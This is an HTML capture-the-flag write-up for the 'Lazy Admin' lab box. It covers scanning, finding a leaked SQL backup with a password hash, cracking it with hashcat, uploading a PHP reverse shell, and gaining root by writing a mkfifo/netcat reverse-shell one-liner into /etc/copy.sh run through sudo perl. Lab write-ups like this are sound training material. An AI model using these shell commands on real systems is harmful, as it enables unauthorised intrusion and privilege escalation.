<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Lazy Admin Writeup</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #111;
            color: #eee;
            margin: 40px;
            line-height: 1.6;
        }
        h1, h2 {
            color: #00bcd4;
        }
        pre {
            background-color: #1e1e1e;
            padding: 15px;
            overflow-x: auto;
            border-radius: 5px;
        }
        code {
            color: #00ff88;
        }
        a {
            color: #4fc3f7;
        }
    </style>
</head>
<body>

<h1>Lazy Admin</h1>

<h2>Nmap Scan</h2>

<p>I started with:</p>

<pre><code>nmap -sC -sV</code></pre>

<pre><code>
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
</code></pre>

<p>SSH (port 22) and HTTP (port 80) are open. The web server is running Apache 2.4.18 on Ubuntu.</p>

<p>When visiting http://host:80, the default Apache landing page appears.</p>

<h2>Directory Enumeration</h2>

<p>I used:</p>

<pre><code>feroxbuster -u http://10.114.130.176/</code></pre>

<p>This revealed the following interesting paths:</p>

<ul>
    <li>http://10.114.130.176/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql</li>
    <li>http://10.114.130.176/content/as/</li>
</ul>

<p>Inside the SQL backup file, I found:</p>

<pre><code>
Username: manager
Hash: 42f749ade7f9e195bf475f37a44cafcb
Password: Password123
</code></pre>

<h2>Hash Cracking</h2>

<p>I cracked the hash using:</p>

<pre><code>hashcat -m 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt</code></pre>

<p>After cracking it, I logged in at:</p>

<pre><code>http://10.114.130.176/content/as/</code></pre>

<h2>Gaining a Shell</h2>

<p>First, I opened a listener:</p>

<pre><code>nc -lvnp 4444</code></pre>

<p>I uploaded a reverse shell as a ZIP file and triggered it.</p>

<p>Reverse shell used:</p>

<pre><code>https://github.com/Arrexel/phpbash/blob/master/phpbash.php</code></pre>

<p>The exploit worked and I obtained a shell.</p>

<h2>User Flag</h2>

<p>The user flag was located at:</p>

<pre><code>/home/itguy/user.txt</code></pre>

<p>I also found a script called <code>backup.pl</code> which uses <code>/etc/copy.sh</code>.</p>

<h2>Privilege Escalation</h2>

<p>I modified <code>/etc/copy.sh</code> to include a reverse shell:</p>

<pre><code>
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc &lt;yourip&gt; 4443 > /tmp/f" > /etc/copy.sh
</code></pre>

<p>Then I opened another listener:</p>

<pre><code>nc -lvnp 4443</code></pre>

<p>And executed:</p>

<pre><code>sudo /usr/bin/perl /home/itguy/backup.pl</code></pre>

<p>After running the command, I received a root shell. Running <code>id</code> confirmed root privileges.</p>

<h2>Root Flag</h2>

<p>The root flag is located at:</p>

<pre><code>/root/root.txt</code></pre>

</body>
</html>
